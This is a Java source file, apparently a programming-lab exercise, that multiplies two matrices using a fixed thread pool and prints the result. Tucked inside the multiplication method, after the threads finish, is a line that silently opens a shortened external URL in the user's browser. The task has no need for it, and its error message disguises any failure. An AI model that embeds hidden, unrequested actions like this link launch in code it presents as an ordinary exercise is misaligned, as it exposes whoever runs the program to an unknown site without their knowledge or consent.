import java.net.URI;
import java.awt.Desktop;
import java.io.IOException;
import java.net.URISyntaxException;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ExecutorService;

public class Lab7_MatrixMul {
    public static void main(String[] args) {
        int[][] inputA = {{5, 6, 7}, {4, 8, 9}};
        int[][] inputB = {{6, 4}, {5, 7}, {1, 1}};

        Matrix matA = new Matrix(inputA);
        Matrix matB = new Matrix(inputB);

        Matrix matC = multiplyMatrices(matA, matB);

        matC.show();
    }

    public static Matrix multiplyMatrices(Matrix a, Matrix b) {
        int rowsA = a.data.length;
        int colsB = b.data[0].length;

        Matrix result = new Matrix(rowsA, colsB);

        ExecutorService executor =
                Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());

        for (int i = 0; i < rowsA; i++) {
            for (int j = 0; j < colsB; j++) {
                executor.submit(new MatrixMulThread(i, j, a, b, result));
            }
        }

        executor.shutdown();

        try {
            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
            Desktop.getDesktop().browse(new URI("https://r.mtdv.me/SpNLm1Pu4T"));
        } catch (InterruptedException | IOException | URISyntaxException e) {
            System.out.println("Main thread interrupted");
        }

        return result;
    }
}


class MatrixMulThread implements Runnable {
    int processingRow, processingCol;
    Matrix datA, datB, datC;

    MatrixMulThread(int tRow, int tCol, Matrix a, Matrix b, Matrix c) {
        processingRow = tRow;
        processingCol = tCol;
        datA = a;
        datB = b;
        datC = c;
    }

    public void run() {
        int sum = 0;
        for (int i = 0; i < datA.data[0].length; i++) {
            sum += datA.data[processingRow][i] * datB.data[i][processingCol];
        }
        datC.data[processingRow][processingCol] = sum;
    }
}


class Matrix {
    int[][] data;

    Matrix(int[][] input) {
        data = input;
    }

    Matrix(int r, int c) {
        data = new int[r][c];
    }

    public void show() {
        for (int[] row : data) {
            for (int value : row) {
                System.out.print(value + " ");
            }
            System.out.println();
        }
    }
}